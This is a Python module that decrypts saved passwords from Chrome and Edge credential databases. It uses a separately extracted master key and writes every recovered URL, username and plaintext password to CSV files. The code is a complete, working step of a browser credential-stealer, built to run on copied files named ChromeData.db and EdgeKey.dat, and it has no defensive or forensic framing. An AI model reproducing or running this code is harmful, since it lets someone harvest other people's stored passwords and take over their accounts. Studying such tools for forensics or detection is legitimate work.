"""
Password decryption module for browser credential databases.

This module handles decryption of passwords stored in Chrome and Edge browser
databases using the extracted master key. It uses AES-256-GCM encryption,
which is the standard encryption method used by Chromium-based browsers.
"""

import sqlite3
import csv
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


def decrypt_password(encrypted_password, master_key):
    """
    Decrypt a password encrypted with AES-256-GCM.

    Chromium browsers use AES-256-GCM to encrypt stored passwords. The encrypted
    data format is: 3-byte header + 12-byte nonce + encrypted data + 16-byte tag.

    Args:
        encrypted_password (bytes): The encrypted password data including nonce and tag
        master_key (bytes): The AES-256 master key for decryption

    Returns:
        str: The decrypted password, or None if decryption fails
    """
    try:
        # Extract components from the encrypted password structure
        # Bytes 0-3: "v10" or similar version prefix
        # Bytes 3-15: Nonce (12 bytes) for GCM mode
        nonce = encrypted_password[3:15]

        # Bytes 15 to -16: Encrypted password data
        encrypted_data = encrypted_password[15:-16]

        # Last 16 bytes: Authentication tag for GCM verification
        tag = encrypted_password[-16:]

        # Create the AES-256-GCM cipher
        cipher = Cipher(
            algorithms.AES(master_key),
            modes.GCM(nonce, tag),
            backend=default_backend()
        )

        # Perform decryption and verify authentication tag
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(encrypted_data) + decryptor.finalize()

        # Decode from bytes to UTF-8 string
        return decrypted_password.decode('utf-8')
    except:
        # Return None if decryption or decoding fails
        return None


def decrypt(data, key, output):
    """
    Decrypt all passwords from a browser's login database and save to CSV.

    Reads encrypted credentials from a Chromium browser's login database,
    decrypts them using the provided master key, and writes the results to
    a CSV file with columns: URL, userName, pwd.

    Args:
        data (str): Path to the browser's "Login Data" SQLite database file
        key (str): Path to the file containing the decrypted master key
        output (str): Path where the CSV file with decrypted credentials will be saved

    Returns:
        None. Writes decrypted credentials to the output CSV file.
    """
    # Read the master key from file
    master_key = open(key, "rb").read()

    # Open the login database
    con = sqlite3.connect(data)
    cur = con.cursor()

    # Query the 'logins' table for signon URL, username, and encrypted password
    cur.execute("SELECT signon_realm, username_value, password_value FROM 'logins'")

    # Write decrypted credentials to CSV file
    with open(output, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        # Write header row
        writer.writerow(["URL", "userName", "pwd"])

        # Process each login entry
        for r in cur.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]

            # Decrypt the password
            pwd = decrypt_password(encrypted_password, master_key)

            # Write to CSV only if decryption was successful
            if pwd:
                writer.writerow([url, username, pwd])

    # Close the database connection
    if con:
        con.close()

if __name__ == "__main__":
    # Decrypt Chrome passwords
    decrypt("ChromeData.db", "ChromeKey.dat", "Chrome.csv")

    # Decrypt Edge passwords
    decrypt("EdgeData.db", "EdgeKey.dat", "Edge.csv")